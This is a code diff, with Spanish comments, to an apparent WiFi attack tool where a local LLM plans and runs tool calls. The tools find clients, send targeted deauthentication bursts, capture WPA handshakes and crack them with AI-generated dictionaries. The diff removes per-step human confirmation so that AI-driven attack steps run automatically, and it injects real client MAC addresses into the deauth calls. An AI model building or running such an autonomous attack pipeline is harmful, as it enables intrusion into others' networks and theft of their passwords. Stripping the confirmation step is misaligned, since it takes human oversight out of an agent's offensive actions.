@@ -1555,7 +1555,7 @@ window.setIaMode = function (on) {
   const toggle = $('ia-mode-toggle'); if (toggle) toggle.checked = window._iaMode;
   const lbl = $('ia-mode-label'); if (lbl) lbl.style.borderColor = window._iaMode ? 'var(--orange)' : '';
   log(window._iaMode
-    ? 'Modo IA ACTIVADO: Atacar usará solo tool-calling de Ollama; cada paso exige confirmación.'
+    ? 'Modo IA ACTIVADO: Atacar usará solo tool-calling de Ollama; los pasos se ejecutan automáticamente (sin confirmación, todo se registra en consola).'
     : 'Modo IA desactivado: Atacar usa el flujo determinista.', 'warn');
   if (window.setIaStatus) window.setIaStatus(window._iaMode ? 'IA: modo tool-calling activo.' : 'Lista para atacar.');
 };
@@ -1610,6 +1610,8 @@ window.iaAttack = async function () {
     let adapters = [];
     try { adapters = ((await window.__invoke('detect_adapters'))?.adapters) || []; } catch (e) { log('[IA] detect_adapters: ' + e, 'warn'); }
     const guidList = adapters.filter(a => a.guid).map(a => a.guid).slice(0, 5).join(', ') || '(ninguno)';
+    // P0: GUID real del adaptador para los pasos de diagnóstico del plan mínimo.
+    const ctxGuidSafe = (ads) => ((ads || []).find(a => a.guid) || {}).guid || '';
     const prompt = [
       'Eres el orquestador de un ataque WiFi en laboratorio (redes propias).',
       'Objetivo real — SSID: ' + (ssid || '?') + ' · BSSID: ' + (bssid || '?') + ' · canal: ' + (ch || '?'),
@@ -1618,7 +1620,13 @@ window.iaAttack = async function () {
       'RESPONDE SOLO con bloques <tool_call>{"name":"nombre","arguments":{...}}</tool_call>, uno por herramienta, sin texto ni numeración.',
       'Devuelve un plan COMPLETO de al menos 3 herramientas: NUNCA solo profile_target. El objetivo ya está validado en el último scan.',
       'Usa únicamente los nombres de las funciones disponibles y argumentos JSON reales. Máximo ' + IA_MAX_STEPS + ' pasos.',
-      'ESTRATEGIA UNIVERSAL: para capturar un handshake sirve SOLO un cliente REAL que conozca la clave. Usa detect_clients sobre el BSSID; si hay STAs, deauth_burst dirigido a esa MAC y captura su reconexión. NUNCA uses trigger_handshake: fabrica un cliente con clave inventada y su M2 no sirve. No propongas pmkid_probe ni wps_pin. Con material .22000 ve directo a inspect_hash/crack_hash. Termina con restore_managed si activaste monitor.',
+      'ESTRATEGIA UNIVERSAL (P0 reactivo): SIEMPRE empieza con verify_channel_rf(guid,bssid) y detect_clients(iface_guid,bssid). ' +
+      'Si detect_clients devuelve clientes REALES, usa deauth_burst dirigido a esa MAC (target_mac) y captura su reconexión. ' +
+      'Si NO hay clientes pero verify_channel_rf cuenta beacons del objetivo y ves PROBE-REQ en el pcap, el dispositivo esta en 5 GHz: ' +
+      'NO lances deauth (seria inutil), usa usb_raw_rx como captura alternativa y explica al usuario que conecte el cliente a la BSS 2.4 GHz ' +
+      '(sin "-5G") o necesita un adaptador 5 GHz (RTL8812AU/MT7612U). ' +
+      'NUNCA uses trigger_handshake: fabrica cliente con clave inventada y su M2 no sirve. No propongas pmkid_probe ni wps_pin. ' +
+      'Con material .22000 ve directo a inspect_hash/crack_hash. Termina con restore_managed si activaste monitor.',
       'Para convert_pcap/inspect_hash/crack_hash puedes poner rutas de marcador de posición: el orquestador las sustituirá por los archivos reales generados en cada paso.',
       'Si el PMF no se puede medir, NO bloquees el ataque: usa deauth dirigido a cliente real. Solo MFPR=1 confirmado bloquea. Si no hay clientes, dilo y no fabriques material.',
       'genera_dictionary_ai y crack_hash también son universales: si no hay clave en wordlists conocidas, pide candidatas a Ollama y crackea con crack_custom manual.',
@@ -1634,11 +1642,12 @@ window.iaAttack = async function () {
     // deauth_burst sigue contando cuando el RT3070 está en WinUSB.
     // E0-30: solo cuenta deauth a cliente REAL. trigger_handshake falsifica
     // la clave y produce un M2 inútil, así que no puede ser la acción válida.
-    const hasForced = () => steps.some(s => String((s && s.name) || '') === 'deauth_burst');
-    // Plan mínimo obligatorio: si el modelo se queda corto o solo propone
-    // consultas/capturas, completar YA (sin otro viaje a Ollama) con
-    // HERRAMIENTAS IA (nunca el pipeline determinista). Se anota en el log.
-    if (steps.length < 3 || !hasAction() || (!material && !hasForced())) {
+    const hasDiag = () => steps.some(s => ['verify_channel_rf', 'detect_clients'].includes(String((s && s.name) || '')));
+    // P0 (2026-11-26): plan mínimo REACTIVO. Antes se añadia deauth_burst ciego
+    // aunque no hubiera cliente (el error de las ultimas sesiones). Ahora el
+    // minimo obliga a DIAGNOSTICAR primero: verify_channel_rf + detect_clients.
+    // El deauth se decide en tiempo de ejecucion con el resultado real de detect_clients.
+    if (steps.length < 3 || !hasAction() || (!material && !hasDiag())) {
       const have = new Set(steps.map(s => String((s && s.name) || '')));
       const minimal = (material
         ? [
@@ -1646,12 +1655,11 @@ window.iaAttack = async function () {
             { name: 'crack_hash', arguments: { hash_file: '/path/to/hash.22000', ssid, bssid } },
           ]
         : [
+            { name: 'verify_channel_rf', arguments: { guid: ctxGuidSafe(adapters), bssid, secs: 3 } },
+            { name: 'detect_clients', arguments: { iface_guid: ctxGuidSafe(adapters), bssid, duration_seconds: 20 } },
             { name: 'profile_target', arguments: { bssid } },
-            { name: 'deauth_burst', arguments: { bssid, channel: ch } },
-            { name: 'inspect_hash', arguments: { hash_path: '/path/to/hash.22000' } },
-            { name: 'crack_hash', arguments: { hash_file: '/path/to/hash.22000', ssid, bssid } },
           ]).filter(x => !have.has(x.name));
-      log('[IA] Plan insuficiente (' + steps.length + ' pasos, sin acción): orquestador añade ' + minimal.length + ' paso(s) mínimo(s) con herramientas IA.', 'warn');
+      log('[IA] Plan insuficiente (' + steps.length + ' pasos): orquestador añade ' + minimal.length + ' paso(s) de DIAGNOSTICO (verify_channel_rf + detect_clients) antes de cualquier TX.', 'warn');
       steps.push(...minimal);
     }
     if (!steps.length) throw new Error('La IA no propuso herramientas válidas. Respuesta: ' + String(plan.response || '(vacía)').slice(0, 300));
@@ -1661,6 +1669,8 @@ window.iaAttack = async function () {
     // La IA inventa rutas de marcador de posición (`/path/to/...`, `LAB.pcap`).
     // Se sustituyen por los archivos REALES producidos por cada paso anterior.
     const ctxPaths = { pcap: null, hash: null, hashOk: false };
+    // P0: resultado de detect_clients en tiempo real, para decidir deauth dirigido.
+    const ctxDiag = { clients: null, rf: null, probedNoClient: false };
     // El modelo deja marcadores (`?`, GUID vacío) en pasos posteriores. Se
     // rellenan con los datos REALES del contexto antes de validar; es enlace
     // de contexto, no una decisión del ataque.
@@ -1683,6 +1693,13 @@ window.iaAttack = async function () {
           log(`[IA] GUID real inyectado en ${name}.`, 'info');
         }
       }
+      if (name === 'verify_channel_rf' && ctx.guid && (!args.guid || !/^\{?[0-9a-fA-F-]{36}\}?$/.test(String(args.guid)))) {
+        args.guid = ctx.guid;
+        log('[IA] GUID real inyectado en verify_channel_rf.', 'info');
+      }
+      if (name === 'convert_ethernet_eapol' && ctx.ssid && (!args.ssid || args.ssid === '?')) args.ssid = ctx.ssid;
+      if (name === 'convert_ethernet_eapol' && ctx.bssid && (!args.bssid || args.bssid === '?')) args.bssid = ctx.bssid;
+      if (name === 'convert_ethernet_eapol' && ctxPaths.pcap && !args.pcap_path) args.pcap_path = ctxPaths.pcap;
       if (name === 'activate_monitor' && (!args.channel || !Number.isInteger(args.channel)) && ctx.channel) args.channel = ctx.channel;
       if ((name === 'keygen_detect' || name === 'crack_hash') && (!args.ssid || args.ssid === '?') && ctx.ssid) args.ssid = ctx.ssid;
       if ((name === 'profile_target' || name === 'crack_hash') && (!args.bssid || args.bssid === '?') && ctx.bssid) args.bssid = ctx.bssid;
@@ -1705,6 +1722,19 @@ window.iaAttack = async function () {
       // E0-30: el cliente falso usa una clave inventada; su M2 no sirve.
       if (name === 'trigger_handshake') {
         log(`[IA] Paso ${i + 1}/${total} omitido (trigger_handshake): clave falsa; se usa deauth a cliente real.`, 'warn');
+        continue;
+      }
+      // P0 (2026-11-26): deauth REACTIVO. Si ya medimos clientes reales:
+      //  - hay clientes → inyectar target_mac (deauth dirigido, no broadcast)
+      //  - 0 clientes + indicios de 5 GHz → OMITIR deauth (sería inútil)
+      // Si detect_clients aún no corrió, se deja pasar (el validador exige BSSID/ch).
+      if (name === 'deauth_burst' && ctxDiag.clients && ctxDiag.clients.length && !args.target_mac) {
+        args.target_mac = ctxDiag.clients[0];
+        log(`[IA] target_mac inyectado desde detect_clients: ${args.target_mac} (deauth DIRIGIDO).`, 'ok');
+      }
+      if (name === 'deauth_burst' && Array.isArray(ctxDiag.clients) && ctxDiag.clients.length === 0) {
+        log(`[IA] Paso ${i + 1}/${total} OMITIDO (deauth_burst): 0 clientes asociados (${ctxDiag.probedNoClient ? 'dispositivo probablemente en 5 GHz' : 'sin STAs'}) ` +
+            '— lanzar deauth sería inútil y no produciría EAPOL. No se fabrica material.', 'warn');
         continue;
       }
       const v = window.iaValidateTool(name, args);
@@ -1774,6 +1804,18 @@ window.iaAttack = async function () {
         else if (/\.pcap(ng)?$/i.test(outFile)) ctxPaths.pcap = outFile;
       }
       if (name === 'inspect_hash' && Number(result && result.total || 0) > 0) ctxPaths.hashOk = true;
+      // P0: guardar diagnóstico en tiempo real para decidir el resto del plan.
+      if (name === 'verify_channel_rf' && result) ctxDiag.rf = String(result);
+      if (name === 'detect_clients' && result && Array.isArray(result.clients)) {
+        ctxDiag.clients = result.clients.slice();
+        if (!result.clients.length && /PROBE-REQ|5 GHz|5GHz/i.test(String(result.message || ''))) {
+          ctxDiag.probedNoClient = true;
+          log('[IA] ⚠ DIAGNÓSTICO: dispositivo sondeando pero NO asociado (probable 5 GHz). ' +
+              'Se omite el deauth ciego: conecta el cliente a la BSS 2.4 GHz o usa adaptador 5 GHz.', 'warn');
+        } else if (result.clients.length) {
+          log('[IA] Cliente(s) real(es) detectado(s): ' + result.clients.join(', ') + ' → deauth dirigido disponible.', 'ok');
+        }
+      }
       if (name === 'detect_adapters' && result && Array.isArray(result.adapters)) {
         const ad = result.adapters.find(a => a && a.guid);
         if (ad) ctx.guid = ad.guid;
